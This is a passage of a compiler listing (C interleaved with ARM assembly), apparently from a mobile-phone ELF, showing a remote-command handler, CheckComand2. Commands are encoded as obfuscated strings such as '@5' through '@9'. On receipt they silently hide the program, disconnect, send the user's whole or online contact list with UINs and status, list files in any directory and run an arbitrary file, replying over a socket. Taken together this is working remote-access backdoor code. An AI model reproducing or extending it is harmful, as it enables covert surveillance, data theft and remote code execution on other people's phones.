   \   00000390   ........           _BLF     RecountMenu,??RecountMenu??rA
    258                silenthide=1;
   \   00000394   B4039FE5           LDR      R0,??CheckComand2_0+0x38  ;; silenthide
    259                gipc.name_to=ipc_xtask_name;
   \   00000398   B4339FE5           LDR      R3,??CheckComand2_0+0x3C  ;; gipc
   \   0000039C   00B080E5           STR      R11,[R0, #+0]
   \   000003A0   B0039FE5           LDR      R0,??CheckComand2_0+0x40  ;; ipc_xtask_name
    260                gipc.name_from=ipc_my_name;
    261                gipc.data=0;
   \   000003A4   089083E5           STR      R9,[R3, #+8]
   \   000003A8   000083E5           STR      R0,[R3, #+0]
   \   000003AC   A8039FE5           LDR      R0,??CheckComand2_0+0x44  ;; ipc_my_name
    262                GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_XTASK_IDLE,&gipc);    
   \   000003B0   0B20A0E1           MOV      R2,R11
   \   000003B4   040083E5           STR      R0,[R3, #+4]
   \   000003B8   B010A0E3           MOV      R1,#+176
   \   000003BC   DE1C81E3           ORR      R1,R1,#0xDE00
   \   000003C0   0900A0E3           MOV      R0,#+9
   \   000003C4   420C80E3           ORR      R0,R0,#0x4200
   \   000003C8   000100EF           SWI      +256
    263                return;    
   \   000003CC   650000EA           B        ??CheckComand2_4
    264              }
    265          
    266              
    267              if(/*strstr(txt,"#disconnect") ||*/ strstr(txt,_DISCONNECT))
   \                     ??CheckComand2_22:
   \   000003D0   D21F8FE2           ADR      R1,??CheckComand2_0+0x8  ;; "@5"
   \   000003D4   0600A0E1           MOV      R0,R6
   \   000003D8   180100EF           SWI      +280
   \   000003DC   000050E3           CMP      R0,#+0
   \   000003E0   1200000A           BEQ      ??CheckComand2_23
    268              {
    269                comanda=0;
    270                disautorecconect=1;
   \   000003E4   74039FE5           LDR      R0,??CheckComand2_0+0x48  ;; disautorecconect
   \   000003E8   00908AE5           STR      R9,[R10, #+0]
   \   000003EC   00B080E5           STR      R11,[R0, #+0]
    271                t->signals=0;
   \   000003F0   709084E5           STR      R9,[R4, #+112]
    272                SENDMSGCOUNT++;
   \   000003F4   000098E5           LDR      R0,[R8, #+0]
   \   000003F8   010080E2           ADD      R0,R0,#+1
   \   000003FC   000088E5           STR      R0,[R8, #+0]
    273          #ifdef kluchnik
    274          #else
    275                void end_socket(void);
    276                SUBPROC((void*)end_socket);
   \   00000400   5C039FE5           LDR      R0,??CheckComand2_0+0x4C  ;; end_socket
   \   00000404   710100EF           SWI      +369
    277          #endif
    278                return;
   \   00000408   560000EA           B        ??CheckComand2_4
   \                     ??CheckComand2_2:
   \   0000040C   40313300           DC8      "@13"
   \   00000410   40313100           DC8      "@11"
   \   00000414   40313200           DC8      "@12"
   \   00000418   40310000           DC8      "@1",+0
   \   0000041C   20000000           DC8      " ",+0,+0
   \   00000420   21000000           DC8      "!",+0,+0
   \   00000424   49620000           DC8      "Ib",+0
   \   00000428   40320000           DC8      "@2",+0
   \   0000042C   40330000           DC8      "@3",+0
    279              }    
    280             
    281              if(/*strstr(txt,"#getclistall") || */strstr(txt,_GETCLISTALL))
   \                     ??CheckComand2_23:
   \   00000430   30739FE5           LDR      R7,??CheckComand2_0+0x50  ;; cltop
   \   00000434   BA1F8FE2           ADR      R1,??CheckComand2_0+0xC  ;; "@6"
   \   00000438   0600A0E1           MOV      R0,R6
   \   0000043C   180100EF           SWI      +280
   \   00000440   000050E3           CMP      R0,#+0
   \   00000444   1C00000A           BEQ      ??CheckComand2_24
    282              {
    283                CLIST *tt;
    284                tt=(CLIST *)(&cltop);
    285                char *s=malloc(16384);
   \   00000448   400CA0E3           MOV      R0,#+16384
   \   0000044C   140000EF           SWI      +20
   \   00000450   0060A0E1           MOV      R6,R0
    286                *s=0;
   \   00000454   0090C6E5           STRB     R9,[R6, #+0]
   \   00000458   110000EA           B        ??CheckComand2_25
    287                char ss[64];
    288                char *q;
    289                while(tt=(CLIST *)(tt->next))
    290                 {
    291                  if(!tt->isgroup)
   \                     ??CheckComand2_26:
   \   0000045C   080097E5           LDR      R0,[R7, #+8]
   \   00000460   000050E3           CMP      R0,#+0
   \   00000464   0E00001A           BNE      ??CheckComand2_25
    292                   {
    293                     q=GetStatusByIconIndex(GetIconIndex(tt));
   \   00000468   0700A0E1           MOV      R0,R7
   \   0000046C   ........           _BLF     GetIconIndex,??GetIconIndex??rA
   \   00000470   ........           _BLF     GetStatusByIconIndex,??GetStatusByIconIndex??rA
    294                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
   \   00000474   01002DE9           PUSH     {R0}
   \   00000478   0C0097E5           LDR      R0,[R7, #+12]
   \   0000047C   143087E2           ADD      R3,R7,#+20
   \   00000480   01002DE9           PUSH     {R0}
   \   00000484   402085E2           ADD      R2,R5,#+64
   \   00000488   4010A0E3           MOV      R1,#+64
   \   0000048C   10008DE2           ADD      R0,SP,#+16
   \   00000490   1B0100EF           SWI      +283
    295                     strcat(s,ss);
   \   00000494   10108DE2           ADD      R1,SP,#+16
   \   00000498   0600A0E1           MOV      R0,R6
   \   0000049C   170000EF           SWI      +23
   \   000004A0   08D08DE2           ADD      SP,SP,#+8
    296                   }
    297                 }
   \                     ??CheckComand2_25:
   \   000004A4   007097E5           LDR      R7,[R7, #+0]
   \   000004A8   000057E3           CMP      R7,#+0
   \   000004AC   EAFFFF1A           BNE      ??CheckComand2_26
    298          #ifdef kluchnik
    299                AddStringToLog(t,0x01,"Sending contact list all...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    300                SendData(t,s,ENA_SIGNAL,0);
    301          #else
    302                SendData(t,s,DIS_SIGNAL,1);
   \   000004B0   0130A0E3           MOV      R3,#+1
   \   000004B4   0920A0E1           MOV      R2,R9
   \   000004B8   7BFFFFEA           B        ??CheckComand2_15
    303          #endif
    304                mfree(s);
    305                return;
    306              }
    307             
    308              if(/*strstr(txt,"#getclist") || */strstr(txt,_GETCLIST))
   \                     ??CheckComand2_24:
   \   000004BC   991F8FE2           ADR      R1,??CheckComand2_0+0x10  ;; "@7"
   \   000004C0   0600A0E1           MOV      R0,R6
   \   000004C4   180100EF           SWI      +280
   \   000004C8   000050E3           CMP      R0,#+0
   \   000004CC   2800000A           BEQ      ??CheckComand2_27
    309              {
    310                CLIST *tt;
    311                tt=(CLIST *)(&cltop);
    312                char *s=malloc(16384);
   \   000004D0   400CA0E3           MOV      R0,#+16384
   \   000004D4   140000EF           SWI      +20
   \   000004D8   0060A0E1           MOV      R6,R0
    313                *s=0;
   \   000004DC   0090C6E5           STRB     R9,[R6, #+0]
   \   000004E0   160000EA           B        ??CheckComand2_28
    314                char ss[64];
    315                char *q;
    316                while(tt=(CLIST *)(tt->next))
    317                 {
    318                  if(tt->state!=0xFFFF && !tt->isgroup)
   \                     ??CheckComand2_29:
   \   000004E4   B405D7E1           LDRH     R0,[R7, #+84]
   \   000004E8   FF10A0E3           MOV      R1,#+255
   \   000004EC   FF1C81E3           ORR      R1,R1,#0xFF00
   \   000004F0   010050E1           CMP      R0,R1
   \   000004F4   1100000A           BEQ      ??CheckComand2_28
   \   000004F8   080097E5           LDR      R0,[R7, #+8]
   \   000004FC   000050E3           CMP      R0,#+0
   \   00000500   0E00001A           BNE      ??CheckComand2_28
    319                   {
    320                     q=GetStatusByIconIndex(GetIconIndex(tt));
   \   00000504   0700A0E1           MOV      R0,R7
   \   00000508   ........           _BLF     GetIconIndex,??GetIconIndex??rA
   \   0000050C   ........           _BLF     GetStatusByIconIndex,??GetStatusByIconIndex??rA
    321                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
   \   00000510   01002DE9           PUSH     {R0}
   \   00000514   0C0097E5           LDR      R0,[R7, #+12]
   \   00000518   143087E2           ADD      R3,R7,#+20
   \   0000051C   01002DE9           PUSH     {R0}
   \   00000520   402085E2           ADD      R2,R5,#+64
   \   00000524   4010A0E3           MOV      R1,#+64
   \   00000528   10008DE2           ADD      R0,SP,#+16
   \   0000052C   1B0100EF           SWI      +283
    322                     strcat(s,ss);
   \   00000530   10108DE2           ADD      R1,SP,#+16
   \   00000534   0600A0E1           MOV      R0,R6
   \   00000538   170000EF           SWI      +23
   \   0000053C   08D08DE2           ADD      SP,SP,#+8
    323                   }
    324                 }
   \                     ??CheckComand2_28:
   \   00000540   007097E5           LDR      R7,[R7, #+0]
   \   00000544   000057E3           CMP      R7,#+0
   \   00000548   E5FFFF1A           BNE      ??CheckComand2_29
    325          #ifdef kluchnik
    326                AddStringToLog(t,0x01,"Sending contact list online...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    327                SendData(t,s,ENA_SIGNAL,0);
    328          #else
    329                SendData(t,s,DIS_SIGNAL,1);
   \   0000054C   0130A0E3           MOV      R3,#+1
   \   00000550   0920A0E1           MOV      R2,R9
   \   00000554   0610A0E1           MOV      R1,R6
   \   00000558   0400A0E1           MOV      R0,R4
   \   0000055C   ........           _BLF     SendData,??SendData??rA
    330          #endif      
    331                mfree(s);
   \   00000560   0600A0E1           MOV      R0,R6
   \                     ??CheckComand2_17:
   \   00000564   150000EF           SWI      +21
    332                return;
   \                     ??CheckComand2_4:
   \   00000568   ACD08DE2           ADD      SP,SP,#+172
   \   0000056C   40DE8DE2           ADD      SP,SP,#+1024
   \   00000570   F08FBDE8           POP      {R4-R11,PC}
    333              }
   \                     ??CheckComand2_27:
   \   00000574   6C1F8FE2           ADR      R1,??CheckComand2_0+0x14  ;; "@8"
   \   00000578   0600A0E1           MOV      R0,R6
    334              
    335           
    336             
    337              if(/*strstr(txt,"#getflist") || */strstr(txt,_GETFLIST))
   \   0000057C   180100EF           SWI      +280
   \   00000580   000050E3           CMP      R0,#+0
   \   00000584   4800000A           BEQ      ??CheckComand2_30
    338               {
    339                 DIR_ENTRY de;
    340                 unsigned int err;
    341                 char *s=malloc(16384);
   \   00000588   400CA0E3           MOV      R0,#+16384
   \   0000058C   140000EF           SWI      +20
   \   00000590   0070A0E1           MOV      R7,R0
    342                 char *path=malloc(256);
   \   00000594   400FA0E3           MOV      R0,#+256
   \   00000598   140000EF           SWI      +20
   \   0000059C   00A0A0E1           MOV      R10,R0
    343                 char p[64];
    344                 if(strstr(txt,_GETFLIST))
   \   000005A0   611F8FE2           ADR      R1,??CheckComand2_0+0x14  ;; "@8"
   \   000005A4   0600A0E1           MOV      R0,R6
   \   000005A8   180100EF           SWI      +280
   \   000005AC   000050E3           CMP      R0,#+0
   \   000005B0   0300000A           BEQ      ??CheckComand2_31
    345                   sprintf(path,per_s,txt+3);
   \   000005B4   B0119FE5           LDR      R1,??CheckComand2_0+0x54  ;; per_s
   \   000005B8   032086E2           ADD      R2,R6,#+3
   \   000005BC   0A00A0E1           MOV      R0,R10
   \   000005C0   160000EF           SWI      +22
    346               /*  else
    347                   sprintf(path,per_s,txt+strlen("#getflist")+1);*/
    348                 char *ptr=path+strlen(path)+1;
   \                     ??CheckComand2_31:
   \   000005C4   0A00A0E1           MOV      R0,R10
   \   000005C8   1B0000EF           SWI      +27
   \   000005CC   0A0080E0           ADD      R0,R0,R10
   \   000005D0   01B080E2           ADD      R11,R0,#+1
    349                 strcat(path,"\\*.*");
   \   000005D4   541085E2           ADD      R1,R5,#+84
   \   000005D8   0A00A0E1           MOV      R0,R10
   \   000005DC   170000EF           SWI      +23
    350                 *s=0;
   \   000005E0   0090C7E5           STRB     R9,[R7, #+0]
    351                 if(FindFirstFile(&de,path,&err))
   \   000005E4   0D20A0E1           MOV      R2,SP
   \   000005E8   0A10A0E1           MOV      R1,R10
   \   000005EC   68008DE2           ADD      R0,SP,#+104
   \   000005F0   6B0000EF           SWI      +107
   \   000005F4   000050E3           CMP      R0,#+0
   \   000005F8   1300000A           BEQ      ??CheckComand2_32
    352                  {
    353                   do
    354                   {
    355                     strcpy(ptr,de.file_name);  
   \                     ??CheckComand2_33:
   \   000005FC   1D108DE2           ADD      R1,SP,#+29
   \   00000600   401F81E2           ADD      R1,R1,#+256
   \   00000604   0B00A0E1           MOV      R0,R11
   \   00000608   1A0000EF           SWI      +26
    356                     if (de.file_attr&FA_DIRECTORY)
   \   0000060C   F409DDE1           LDRSH    R0,[SP, #+148]
   \   00000610   1D208DE2           ADD      R2,SP,#+29
   \   00000614   402F82E2           ADD      R2,R2,#+256
   \   00000618   100010E3           TST      R0,#0x10
    357                       sprintf(p,"\\%s\r\n",de.file_name);
   \   0000061C   5C108512           ADDNE    R1,R5,#+92
    358                     else
    359                      sprintf(p," %s\r\n",de.file_name);
   \   00000620   64108502           ADDEQ    R1,R5,#+100
   \   00000624   08008DE2           ADD      R0,SP,#+8
   \   00000628   160000EF           SWI      +22
    360                      strcat(s,p);
   \   0000062C   08108DE2           ADD      R1,SP,#+8
   \   00000630   0700A0E1           MOV      R0,R7
   \   00000634   170000EF           SWI      +23
    361                   }
    362                   while(FindNextFile(&de,&err));
   \   00000638   0D10A0E1           MOV      R1,SP
   \   0000063C   68008DE2           ADD      R0,SP,#+104
   \   00000640   6C0000EF           SWI      +108
   \   00000644   000050E3           CMP      R0,#+0
   \   00000648   EBFFFF1A           BNE      ??CheckComand2_33
    363                  }
    364                 FindClose(&de,&err);
   \                     ??CheckComand2_32:
   \   0000064C   0D10A0E1           MOV      R1,SP
   \   00000650   68008DE2           ADD      R0,SP,#+104
   \   00000654   6D0000EF           SWI      +109
    365                 mfree(path);
   \   00000658   0A00A0E1           MOV      R0,R10
   \   0000065C   150000EF           SWI      +21
    366                 if(!s) sprintf(s,"dr ( %s ) n f",txt+strlen(_GETFLIST)+1);
   \   00000660   000057E3           CMP      R7,#+0
   \   00000664   0600001A           BNE      ??CheckComand2_34
   \   00000668   2F0F8FE2           ADR      R0,??CheckComand2_0+0x14  ;; "@8"
   \   0000066C   1B0000EF           SWI      +27
   \   00000670   060080E0           ADD      R0,R0,R6
   \   00000674   012080E2           ADD      R2,R0,#+1
   \   00000678   6C1085E2           ADD      R1,R5,#+108
   \   0000067C   0000A0E3           MOV      R0,#+0
   \   00000680   160000EF           SWI      +22
    367            
    368            #ifdef kluchnik
    369                 char *ss=malloc(256);
    370                 sprintf(ss,"Recive command < Get files from directory %s >",txt+strlen(_GETFLIST)+1);
    371                 AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    372                 if(SHOW_ACTIVE)
    373                   t->isactive=ACTIVE_TIME;
    374                 SendData(t,s,ENA_SIGNAL,0);
    375                 mfree(ss);
    376            #else
    377                 SENDMSGCOUNT++;
   \                     ??CheckComand2_34:
   \   00000684   000098E5           LDR      R0,[R8, #+0]
    378                 SendData(t,s,DIS_SIGNAL,0);
   \   00000688   0030A0E3           MOV      R3,#+0
   \   0000068C   010080E2           ADD      R0,R0,#+1
   \   00000690   000088E5           STR      R0,[R8, #+0]
   \   00000694   0320A0E1           MOV      R2,R3
   \   00000698   0710A0E1           MOV      R1,R7
   \   0000069C   0400A0E1           MOV      R0,R4
   \   000006A0   ........           _BLF     SendData,??SendData??rA
    379            #endif      
    380                 mfree(s);
   \   000006A4   0700A0E1           MOV      R0,R7
   \   000006A8   ADFFFFEA           B        ??CheckComand2_17
    381                 return;
    382               }
    383                
    384             if(/*strstr(txt,"#runfile") ||*/ strstr(txt,_RUNFILE))
   \                     ??CheckComand2_30:
   \   000006AC   1F7F8FE2           ADR      R7,??CheckComand2_0+0x18  ;; "@9"
   \   000006B0   0710A0E1           MOV      R1,R7
   \   000006B4   0600A0E1           MOV      R0,R6
   \   000006B8   180100EF           SWI      +280
   \   000006BC   000050E3           CMP      R0,#+0
   \   000006C0   1100000A           BEQ      ??CheckComand2_1
    385             {   
    386          #ifdef kluchnik
    387               char *ss=malloc(256);
    388               sprintf(ss,"Recive command < Run file %s >",txt+strlen(_RUNFILE)+1);
    389               AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    390               SendData(t,"File was been runned!!",ENA_SIGNAL,0);
    391               mfree(ss);
    392          #else
    393               int i=0;
    394               if(strstr(txt,_RUNFILE)) i=start(txt+3);
   \   000006C4   0710A0E1           MOV      R1,R7
   \   000006C8   0600A0E1           MOV      R0,R6
   \   000006CC   180100EF           SWI      +280
   \   000006D0   000050E3           CMP      R0,#+0
   \   000006D4   0700000A           BEQ      ??CheckComand2_35
    395             //  else i=start(txt+strlen("#runfile")+1);
    396                  
    397               if(i)
   \   000006D8   030086E2           ADD      R0,R6,#+3
   \   000006DC   ........           BL       start
   \   000006E0   000050E3           CMP      R0,#+0
   \   000006E4   0300000A           BEQ      ??CheckComand2_35
    398                 SendData(t,"run!",DIS_SIGNAL,1);
   \   000006E8   0130A0E3           MOV      R3,#+1
   \   000006EC   0920A0E1           MOV      R2,R9
   \   000006F0   7C1085E2           ADD      R1,R5,#+124
   \   000006F4   020000EA           B        ??CheckComand2_19
    399               else
    400                 SendData(t,"nrun!",DIS_SIGNAL,1);
   \                     ??CheckComand2_35:
   \   000006F8   0130A0E3           MOV      R3,#+1
   \   000006FC   0920A0E1           MOV      R2,R9
   \   00000700   841085E2           ADD      R1,R5,#+132
   \                     ??CheckComand2_19:
   \   00000704   0400A0E1           MOV      R0,R4
   \   00000708   ........           _BLF     SendData,??SendData??rA
   \                     ??CheckComand2_1:
   \   0000070C   ACD08DE2           ADD      SP,SP,#+172
   \   00000710   40DE8DE2           ADD      SP,SP,#+1024
   \   00000714   F08FBDE8           POP      {R4-R11,PC}      ;; return
   \                     ??CheckComand2_0:
   \   00000718   61637400           DC8      "act"
   \   0000071C   40340000           DC8      "@4",+0
   \   00000720   40350000           DC8      "@5",+0
   \   00000724   40360000           DC8      "@6",+0
   \   00000728   40370000           DC8      "@7",+0
   \   0000072C   40380000           DC8      "@8",+0
   \   00000730   40390000           DC8      "@9",+0
   \   00000734   ........           DC32     comanda
   \   00000738   ........           DC32     SENDMSGCOUNT
   \   0000073C   ........           DC32     SendAnswer
   \   00000740   ........           DC32     ElfKiller
   \   00000744   ........           DC32     `?<Constant "@Ms s: %s">`
   \   00000748   ........           DC32     vibra_count
   \   0000074C   ........           DC32     VIBR_TYPE
   \   00000750   ........           DC32     silenthide
   \   00000754   ........           DC32     gipc
   \   00000758   ........           DC32     ipc_xtask_name
   \   0000075C   ........           DC32     ipc_my_name
   \   00000760   ........           DC32     disautorecconect
   \   00000764   ........           DC32     end_socket
   \   00000768   ........           DC32     cltop
   \   0000076C   ........           DC32     per_s
    401          #endif
    402               return;
    403             }   
    404           }//if(txt[0]=='#' && t->remoteAccess!=4)
    405          }

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "NULL pointer function!">`:
   \   00000000   4E554C4C2070       DC8 "NULL pointer function!"
   \              6F696E746572
   \              2066756E6374
   \              696F6E2100  
   \   00000017   00                 DC8 0
   \   00000018   2530385800         DC8 "%08X"
   \   0000001D   000000             DC8 0, 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313300           DC8 "@13"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313100           DC8 "@11"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313200           DC8 "@12"

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "@Ms s: %s">`:
   \   00000000   404D7320733A       DC8 "@Ms s: %s"
   \              20257300    
   \   0000000A   0000               DC8 0, 0
   \   0000000C   6D205B202573       DC8 "m [ %s ] to [ %s ] n [ %s ] s."
   \              205D20746F20
   \              5B202573205D
   \              206E205B2025
   \              73205D20732E
   \              00          
   \   0000002B   00                 DC8 0
   \   0000002C   4D2025732073       DC8 "M %s snd"
   \              6E6400      
   \   00000035   000000             DC8 0, 0, 0
   \   00000038   7363722E2E00       DC8 "scr.."
   \   0000003E   0000               DC8 0, 0
   \   00000040   257320282025       DC8 "%s ( %d ) [%s]\015\012"
   \              642029205B25
   \              735D0D0A00  
   \   00000051   000000             DC8 0, 0, 0
   \   00000054   5C2A2E2A00         DC8 "\\*.*"
   \   00000059   000000             DC8 0, 0, 0
   \   0000005C   5C25730D0A00       DC8 "\\%s\015\012"
   \   00000062   0000               DC8 0, 0
   \   00000064   2025730D0A00       DC8 " %s\015\012"
   \   0000006A   0000               DC8 0, 0
   \   0000006C   647220282025       DC8 "dr ( %s ) n f"
   \              732029206E20
   \              6600        
   \   0000007A   0000               DC8 0, 0
   \   0000007C   72756E2100         DC8 "run!"
   \   00000081   000000             DC8 0, 0, 0
   \   00000084   6E72756E2100       DC8 "nrun!"
   \   0000008A   0000               DC8 0, 0

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403100             DC8 "@1"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   2100               DC8 "!"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   2000               DC8 " "

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   496200             DC8 "Ib"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403200             DC8 "@2"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   61637400           DC8 "act"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403300             DC8 "@3"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403400             DC8 "@4"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403500             DC8 "@5"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403600             DC8 "@6"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403700             DC8 "@7"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403800             DC8 "@8"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403900             DC8 "@9"

   Maximum stack usage in bytes:

     Function      CSTACK
     --------      ------
     CheckComand2   1240
     get_file_size    48
     start            16


   Segment part sizes:

     Function/Label                 Bytes
     --------------                 -----
     get_file_size                    40
     start                           468
     CheckComand2                   1904
     ?<Constant "NULL pointer function!">
                                      32
     ?<Constant "@13">                 4
     ?<Constant "@11">                 4
     ?<Constant "@12">                 4
     ?<Constant "@Ms s: %s">         140
     ?<Constant "@1">                  3
     ?<Constant "!">                   2
     ?<Constant " ">                   2
     ?<Constant "Ib">                  3
     ?<Constant "@2">                  3
     ?<Constant "act">                 4
     ?<Constant "@3">                  3
     ?<Constant "@4">                  3
     ?<Constant "@5">                  3
     ?<Constant "@6">                  3
     ?<Constant "@7">                  3
     ?<Constant "@8">                  3
     ?<Constant "@9">                  3
      Others                          96

 
 2 508 bytes in segment CODE
   222 bytes in segment DATA_C
 
 2 412 bytes of CODE  memory (+ 96 bytes shared)
   222 bytes of CONST memory

Errors: none
Warnings: none
